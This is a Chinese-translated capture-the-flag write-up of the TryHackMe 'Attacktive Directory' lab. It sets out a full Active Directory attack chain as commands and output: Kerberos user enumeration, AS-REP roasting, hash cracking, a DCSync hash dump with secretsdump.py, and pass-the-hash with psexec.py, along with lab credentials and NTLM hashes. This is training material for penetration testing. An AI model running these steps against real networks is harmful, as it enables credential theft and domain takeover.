<html>
<head>
<title>THM: Attacktive Directory</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">THM:攻击目录</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/thm-attacktive-directory-7db6d7e5b0f5?source=collection_archive---------0-----------------------#2022-04-10">https://infosecwriteups.com/thm-attacktive-directory-7db6d7e5b0f5?source=collection_archive---------0-----------------------#2022-04-10</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/0d6698d15a9fdd7735c96e32ea75c2f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:670/format:webp/1*FK_tF6Ep8Wb_l1xs01gZHQ.png"/></div></figure><p id="4df9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在本文中，我通过枚举运行在开放端口上的服务、滥用Kerberos特性以及提升我在域控制器上的特权来收集所有挑战标志，逐步完成了利用域控制器的过程。该挑战在TryHackMe平台上可用，标题为“<strong class="jw ir">攻击目录</strong>，由用户“<a class="ae ks" href="https://tryhackme.com/p/Sq00ky" rel="noopener ugc nofollow" target="_blank"> <em class="kt">幽灵</em> </a>”创建。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="852a" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">放弃</h1><p id="9867" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">我喜欢在一篇文章之前添加一个简短的免责声明，以鼓励人们在阅读本文之前尝试一下这个房间，因为在这篇文章中显然会有<strong class="jw ir">剧透</strong> <strong class="jw ir">。我相信，如果你先自己尝试，然后在遇到困难或需要提示时再回来写这篇文章，你会更喜欢这个挑战。因此，没有任何进一步的拖延，让我们开始吧！</strong></p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="e7f6" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">什么是活动目录？</h1><p id="2667" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">Active directory是Microsoft开发的一项服务，用于管理Windows域网络并存储与对象(如计算机、用户、打印机等)相关的信息。这使得管理员和用户更容易找到和使用关于对象的信息。在Active Directory中，有一个名为<strong class="jw ir">域控制器</strong>的服务器。域控制器提供身份验证和授权服务，将更新复制到域/林中的其他域控制器，并允许管理访问来管理用户帐户和网络资源。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="1113" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">端口服务枚举</h1><p id="dee6" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">我开始枚举目标机器，用<strong class="jw ir"> NMAP </strong>执行快速扫描来识别任何打开的端口。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="b6f6" class="mn lc iq mj b gy mo mp l mq mr">nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.253.179</span><span id="49cc" class="mn lc iq mj b gy ms mp l mq mr">PORT      STATE SERVICE        REASON<br/>53/tcp    open  domain         syn-ack ttl 125<br/>80/tcp    open  http           syn-ack ttl 125<br/>88/tcp    open  kerberos-sec   syn-ack ttl 125<br/>135/tcp   open  msrpc          syn-ack ttl 125<br/>139/tcp   open  netbios-ssn    syn-ack ttl 125<br/>389/tcp   open  ldap           syn-ack ttl 125<br/>445/tcp   open  microsoft-ds   syn-ack ttl 125<br/>464/tcp   open  kpasswd5       syn-ack ttl 125<br/>593/tcp   open  http-rpc-epmap syn-ack ttl 125<br/>636/tcp   open  ldapssl        syn-ack ttl 125<br/>3389/tcp  open  ms-wbt-server  syn-ack ttl 125<br/>5985/tcp  open  wsman          syn-ack ttl 125<br/>9389/tcp  open  adws           syn-ack ttl 125<br/>47001/tcp open  winrm          syn-ack ttl 125<br/>49664/tcp open  unknown        syn-ack ttl 125<br/>49665/tcp open  unknown        syn-ack ttl 125<br/>49666/tcp open  unknown        syn-ack ttl 125<br/>49669/tcp open  unknown        syn-ack ttl 125<br/>49672/tcp open  unknown        syn-ack ttl 125<br/>49673/tcp open  unknown        syn-ack ttl 125<br/>49674/tcp open  unknown        syn-ack ttl 125<br/>49678/tcp open  unknown        syn-ack ttl 125<br/>49684/tcp open  unknown        syn-ack ttl 125<br/>49695/tcp open  unknown        syn-ack ttl 125</span></pre><p id="0d11" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">查看输出，我可以看到有24个端口是打开的。接下来，我使用NMAP来识别每个端口上运行的服务，并使用通用的NSE脚本来查找我可以利用的任何常见漏洞。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="63f8" class="mn lc iq mj b gy mo mp l mq mr">nmap -sV -sC -Pn -v -oN nmap-report -p 53,80,88,135,139,389,445,464,593,636,3389,5985,9389,47001,49664,49665,49666,49669,49672,49673,49674,49678,49684,49695 10.10.253.179</span><span id="9bd5" class="mn lc iq mj b gy ms mp l mq mr">PORT      STATE SERVICE       VERSION<br/>53/tcp    open  domain?<br/>| fingerprint-strings: <br/>|   DNSVersionBindReqTCP: <br/>|     version<br/>|_    bind<br/>80/tcp    open  http          Microsoft IIS httpd 10.0<br/>| http-methods: <br/>|   Supported Methods: OPTIONS TRACE GET HEAD POST<br/>|_  Potentially risky methods: TRACE<br/>|_http-server-header: Microsoft-IIS/10.0<br/>|_http-title: IIS Windows Server<br/>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-20 15:08:02Z)<br/>135/tcp   open  msrpc         Microsoft Windows RPC<br/>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br/>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)<br/>445/tcp   open  microsoft-ds?<br/>464/tcp   open  kpasswd5?<br/>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br/>636/tcp   open  tcpwrapped<br/>3389/tcp  open  ms-wbt-server Microsoft Terminal Services<br/>| rdp-ntlm-info: <br/>|   Target_Name: THM-AD<br/>|   NetBIOS_Domain_Name: THM-AD<br/>|   NetBIOS_Computer_Name: ATTACKTIVEDIREC<br/>|   DNS_Domain_Name: spookysec.local<br/>|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local<br/>|   Product_Version: 10.0.17763<br/>|_  System_Time: 2022-03-20T15:10:30+00:00<br/>| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local<br/>| Issuer: commonName=AttacktiveDirectory.spookysec.local<br/>| Public Key type: rsa<br/>| Public Key bits: 2048<br/>| Signature Algorithm: sha256WithRSAEncryption<br/>| Not valid before: 2022-03-19T14:57:07<br/>| Not valid after:  2022-09-18T14:57:07<br/>| MD5:   98b7 aa02 99ce 8fac 662f 00bb 1c1f 2924<br/>|_SHA-1: 6c83 7335 c65a 610b 4477 d012 08b9 2223 aed5 ebd0<br/>|_ssl-date: 2022-03-20T15:10:46+00:00; -1s from scanner time.<br/>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br/>|_http-server-header: Microsoft-HTTPAPI/2.0<br/>|_http-title: Not Found<br/>9389/tcp  open  mc-nmf        .NET Message Framing<br/>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br/>|_http-server-header: Microsoft-HTTPAPI/2.0<br/>|_http-title: Not Found<br/>49664/tcp open  msrpc         Microsoft Windows RPC<br/>49665/tcp open  msrpc         Microsoft Windows RPC<br/>49666/tcp open  msrpc         Microsoft Windows RPC<br/>49669/tcp open  msrpc         Microsoft Windows RPC<br/>49672/tcp open  msrpc         Microsoft Windows RPC<br/>49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br/>49674/tcp open  msrpc         Microsoft Windows RPC<br/>49678/tcp open  msrpc         Microsoft Windows RPC<br/>49684/tcp open  msrpc         Microsoft Windows RPC<br/>49695/tcp open  msrpc         Microsoft Windows RPC</span></pre><p id="e11b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我可以看到一些由NMAP确定的有趣的服务运行在开放的端口上，我们可以进一步列举。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="f103" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">SMB枚举</h1><p id="c8e1" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">我可以看到端口139和445是打开的。端口139和445用于<strong class="jw ir">认证和文件共享</strong>。有多种工具可用于枚举端口139/445。我们可以从使用<strong class="jw ir"> enum4linux </strong>来查找目标上的股份信息开始。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="c95a" class="mn lc iq mj b gy mo mp l mq mr"># -a: does all simple enumeration(-U -S -G -P -r -o -n -i).<br/>$ enum4linux -a 10.10.201.126</span><span id="0653" class="mn lc iq mj b gy ms mp l mq mr">============================================ <br/>|    Getting domain SID for 10.10.201.126    |<br/> ============================================ <br/>Domain Name: THM-AD<br/>Domain Sid: S-1-5-21-3591857110-2884097990-301047963<br/>[+] Host is part of a domain (not a workgroup)</span></pre><p id="eb31" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这为我们提供了一些有用的信息，比如机器的<strong class="jw ir">NetBIOS-域名</strong>，它是DNS域名的子域。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="494c" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">RDP枚举</h1><p id="9967" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">继续查看之前执行的NMAP扫描的输出，我可以看到端口3389 (RDP)上泄露了一些额外的Windows主机和域信息。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="3890" class="mn lc iq mj b gy mo mp l mq mr">3389/tcp  open  ms-wbt-server Microsoft Terminal Services<br/>| rdp-ntlm-info: <br/>|   Target_Name: THM-AD<br/>|   NetBIOS_Domain_Name: THM-AD<br/>|   NetBIOS_Computer_Name: ATTACKTIVEDIREC<br/>|   DNS_Domain_Name: spookysec.local<br/>|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local<br/>|   Product_Version: 10.0.17763<br/>|_  System_Time: 2022-03-20T15:10:30+00:00</span></pre><p id="6714" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我还可以看到顶级域名(TLD) <strong class="jw ir">。使用了local </strong>，这是人们过去常用的活动目录域，但根据<a class="ae ks" href="https://wiki.samba.org/index.php/Active_Directory_Naming_FAQ" rel="noopener ugc nofollow" target="_blank">活动目录命名常见问题解答</a>，现在应该避免使用。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="038a" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">Kerberos枚举和利用</h1><p id="ce38" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">Kerberos是运行在端口88上的Active Directory中的一项关键身份验证服务。我们可以使用工具<strong class="jw ir">Kerberos</strong>来枚举用户，通过Kerberos预认证，可以快速强制枚举有效的Active Directory帐户。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="68ff" class="mn lc iq mj b gy mo mp l mq mr">./kerbrute_linux_amd64 userenum --dc 10.10.253.179 -d spookysec.local -o kerbrute-user-enum userlist</span><span id="ff31" class="mn lc iq mj b gy ms mp l mq mr">2022/03/20 15:34:28 &gt;  Using KDC(s):<br/>2022/03/20 15:34:28 &gt;   10.10.253.179:88</span><span id="a20f" class="mn lc iq mj b gy ms mp l mq mr">2022/03/20 15:34:29 &gt;  [+] VALID USERNAME: james@spookysec.local<br/>2022/03/20 15:34:35 &gt;  [+] VALID USERNAME: svc-admin@spookysec.local  <br/>2022/03/20 15:34:44 &gt;  [+] VALID USERNAME: James@spookysec.local<br/>2022/03/20 15:34:47 &gt;  [+] VALID USERNAME: robin@spookysec.local<br/>2022/03/20 15:35:14 &gt;  [+] VALID USERNAME: darkstar@spookysec.local<br/>2022/03/20 15:35:37 &gt;  [+] VALID USERNAME:       administrator@spookysec.local<br/>2022/03/20 15:36:11 &gt;  [+] VALID USERNAME: backup@spookysec.local<br/>2022/03/20 15:36:32 &gt;  [+] VALID USERNAME: paradox@spookysec.local<br/>2022/03/20 15:39:16 &gt;  [+] VALID USERNAME: Robin@spookysec.local<br/>2022/03/20 15:43:20 &gt;  [+] VALID USERNAME: Administrator@spookysec.local<br/>2022/03/20 15:51:29 &gt;  [+] VALID USERNAME: Darkstar@spookysec.local<br/>2022/03/20 15:54:07 &gt;  [+] VALID USERNAME: Paradox@spookysec.local<br/>2022/03/20 16:02:39 &gt;  [+] VALID USERNAME: DARKSTAR@spookysec.local<br/>2022/03/20 16:04:59 &gt;  [+] VALID USERNAME: ori@spookysec.local<br/>2022/03/20 16:11:05 &gt;  [+] VALID USERNAME: ROBIN@spookysec.local<br/>2022/03/20 16:25:53 &gt;  Done! Tested 73317 usernames (16 valid) in 3084.883 seconds</span></pre><p id="c72b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们可以看到发现了16个帐户，包括一个服务管理帐户(即<strong class="jw ir"> svc-admin </strong>)和一个<strong class="jw ir">备份</strong>帐户，这是特别感兴趣的。使用新发现的帐户列表，我们可以尝试滥用Kerberos中的一个特性，使用一种叫做<strong class="jw ir">as re proposing的攻击方法。</strong></p><blockquote class="mt mu mv"><p id="c88a" class="ju jv kt jw b jx jy jz ka kb kc kd ke mw kg kh ki mx kk kl km my ko kp kq kr ij bi translated">当用户帐户设置了“不需要预验证”权限时，会发生重新发布。这意味着帐户<strong class="jw ir">在请求指定用户帐户上的Kerberos票据之前不需要</strong>提供有效的身份证明。</p></blockquote><p id="85b6" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们可以在<a class="ae ks" href="https://github.com/SecureAuthCorp/impacket" rel="noopener ugc nofollow" target="_blank"> Impacket </a>中使用一个名为“<strong class="jw ir"> GetNPUsers.py </strong>的工具来检索Kerberos票据。这允许我们从密钥分发中心查询可恢复的帐户。查询帐户唯一需要的是一组有效的用户名，我们之前已经通过Kerbrute列举过了。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="fbe2" class="mn lc iq mj b gy mo mp l mq mr">python3 GetNPUsers.py spookysec.local/ -dc-ip 10.10.253.179 -usersfile kerberos-usernames -no-pass -request -outputfile kerberos-users-found</span></pre><p id="ff02" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在运行“<strong class="jw ir"> GetNPUsers.py </strong>”之后，我可以看到您可以从svc-admin用户帐户查询一张没有密码的票。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="a931" class="mn lc iq mj b gy mo mp l mq mr">$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:408ee4a3e91ec877b931d35c56364c77$63dc9e093d6f3ddfd0074033786ed4d4d6e5f3e9f27be7f98866c0c91c4271c6c8a721eafa9e343a2b9638da64fe71d7563c31e51e6aac0686ba9025ab8ff2d41b8b24f38888cd803c70568744a12daa95cca16b73fa6bc5b20f1fb697b29fd1fe39fa0553ae07ad7e6e2f5232e306ee2abf3ee2ba8ebc704bc96f0d60cd245f96f4caa7c20c3a673fba2b25a384593b01e334560348a146d9168e1fc594b8c59e11382193bd2b3f1c421f9d5fdc61167c8f3bfa18d60fc6fca79923c16b707927719330363b593c28ccc0c7dd2c5e7696b43d45a4bc016341f773805c53f51d2b6ae4a0fa3c3280a18a9d53d9b5fd08337c</span></pre><p id="02fe" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">接下来，我们可以使用<strong class="jw ir"> Hashcat </strong>来破解从KDC中检索到的“Kerberos 5 AS-REP etype 23”散列。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="144e" class="mn lc iq mj b gy mo mp l mq mr">hashcat64.exe -m 18200 -a 0 hash.txt rockyou.txt -o cracked.txt</span><span id="6a5c" class="mn lc iq mj b gy ms mp l mq mr">&lt;hash&gt;:mana**********</span></pre><p id="3afe" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这为我们提供了一组凭据，我们现在可以使用这些凭据来枚举域控制器可能发出的任何共享。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="21a0" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">SMB枚举(续。)</h1><p id="2ebd" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">使用svc-admin凭据，我现在可以进一步列举DC上的共享。我可以使用工具<strong class="jw ir"> smbclient </strong>在DC上市股票。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="75f5" class="mn lc iq mj b gy mo mp l mq mr">smbclient -L //10.10.200.95 -U svc-admin<br/>Enter WORKGROUP\svc-admin's password:</span><span id="4d62" class="mn lc iq mj b gy ms mp l mq mr">        Sharename       Type      Comment<br/>        ---------       ----      -------<br/>        ADMIN$          Disk      Remote Admin<br/>        backup          Disk      <br/>        C$              Disk      Default share<br/>        IPC$            IPC       Remote IPC<br/>        NETLOGON        Disk      Logon server share <br/>        SYSVOL          Disk      Logon server share</span></pre><p id="55e4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我可以看到服务器列出了六个共享，包括一个名为<strong class="jw ir">备份</strong>的共享。此共享包含一个名为“<em class="kt"> backup_credentials.txt </em>”的文本文件，其中包含base64编码的文本。解码此文本将为备份用户帐户提供凭据。</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/be4348947847282c20aa6368da309d95.png" data-original-src="https://miro.medium.com/v2/resize:fit:792/format:webp/1*7oUs_sEGmri0IR2DO0lZxg.png"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">CyberChef Base64解码凭证。</figcaption></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="e901" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">域权限提升</h1><p id="8f54" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">根据挑战描述，备份帐户具有唯一权限，允许<strong class="jw ir">所有活动目录更改与此用户帐户同步，</strong>包括密码哈希。我们可以在Impacket中使用一个名为“<strong class="jw ir"> secretsdump.py </strong>”的工具来检索这个用户帐户(与域控制器同步)必须提供的所有密码哈希。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="f765" class="mn lc iq mj b gy mo mp l mq mr">python3 secretsdump.py spookysec.local/backup:'backup2517860'<a class="ae ks" href="http://twitter.com/10" rel="noopener ugc nofollow" target="_blank">@10</a>.10.25.158 -just-dc</span></pre><p id="d142" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">“<strong class="jw ir"> secretsdump.py </strong>”使用DRSUAPI方法获取NTDS。DIT秘密。</p><blockquote class="mt mu mv"><p id="5ddb" class="ju jv kt jw b jx jy jz ka kb kc kd ke mw kg kh ki mx kk kl km my ko kp kq kr ij bi translated">Ntds。dit文件是存储Active Directory数据的数据库，包括有关用户对象、组和组成员的信息。重要的是，该文件还存储了域中所有用户的密码散列。</p></blockquote><p id="1bd0" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这个工具为DC机器上的所有用户转储NTLM散列。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="17d3" class="mn lc iq mj b gy mo mp l mq mr">Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::<br/>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::</span><span id="e36b" class="mn lc iq mj b gy ms mp l mq mr">.....etc.....</span></pre></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="347f" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">传递哈希(PtH)攻击</h1><p id="fad8" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">一种攻击方法是<strong class="jw ir">Pass Hash</strong>攻击，它可以让我们在没有密码的情况下验证用户身份。</p><blockquote class="mt mu mv"><p id="72a7" class="ju jv kt jw b jx jy jz ka kb kc kd ke mw kg kh ki mx kk kl km my ko kp kq kr ij bi translated">传递哈希攻击是一种技术，攻击者通过这种技术捕获密码哈希(相对于密码字符)，然后简单地传递它以进行身份验证，并可能横向访问其他网络系统。</p></blockquote><p id="73f1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">有多种工具可以用来执行pass hash攻击，包括<strong class="jw ir"> Evil-WinRM </strong>、<strong class="jw ir"> crackmapexec </strong>和<strong class="jw ir"> psexec.py </strong>。我很难让Evil-WinRM工作，但能够使用psexec.py获得一个带有管理员NTLM哈希的shell。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="cba3" class="mn lc iq mj b gy mo mp l mq mr">python3 psexec.py Administrator@10.10.25.158 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc</span><span id="68ad" class="mn lc iq mj b gy ms mp l mq mr">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><span id="2f88" class="mn lc iq mj b gy ms mp l mq mr">[*] Requesting shares on 10.10.200.95.....<br/>[*] Found writable share ADMIN$<br/>[*] Uploading file eanlOsfQ.exe<br/>[*] Opening SVCManager on 10.10.200.95.....<br/>[*] Creating service GzYy on 10.10.200.95.....<br/>[*] Starting service GzYy.....<br/>[!] Press help for extra shell commands<br/>Microsoft Windows [Version 10.0.17763.1490]<br/>(c) 2018 Microsoft Corporation. All rights reserved.</span><span id="e1f3" class="mn lc iq mj b gy ms mp l mq mr">C:\Windows\system32&gt;</span></pre><p id="04ea" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">从这里，我可以有效地完全控制AD域，并可以检索所有三个标志。</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi ne"><img src="../Images/ec7a2bcaad80fba209b829c3244ea9db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1010/format:webp/1*veVVE2SR00MYyeX2tJMz-Q.png"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">用户标志。</figcaption></figure><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/122486f117a3389836c3528b43962eb8.png" data-original-src="https://miro.medium.com/v2/resize:fit:918/format:webp/1*toC_TGPHwtZb83FVJ16lUw.png"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">权限提升标志。</figcaption></figure><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/58f42142a5879df319e1a81c8fb0e76c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1008/format:webp/1*q07yBp1u447POEJ-pyxShA.png"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">根标志。</figcaption></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="df60" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">最后的想法</h1><p id="f369" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">我真的很喜欢在这个房间里工作，并有机会学习更多关于利用Active Directory域控制器的知识。谢谢你一直读到最后，继续黑下去😄！</p><div class="nh ni gp gr nj nk"><a href="https://tryhackme.com/" rel="noopener  ugc nofollow" target="_blank"><div class="nl ab fo"><div class="nm ab nn cl cj no"><h2 class="bd ir gy z fp np fr fs nq fu fw ip bi translated">网络安全培训</h2><div class="nr l"><h3 class="bd b gy z fp np fr fs nq fu fw dk translated">TryHackMe是一个免费的学习网络安全的在线平台，使用动手练习和实验室，通过您的…</h3></div><div class="ns l"><p class="bd b dl z fp np fr fs nq fu fw dk translated">tryhackme.com</p></div></div><div class="nt l"><div class="nu l nv nw nx nt ny js nk"/></div></div></a></div></div></div>    
</body>
</html>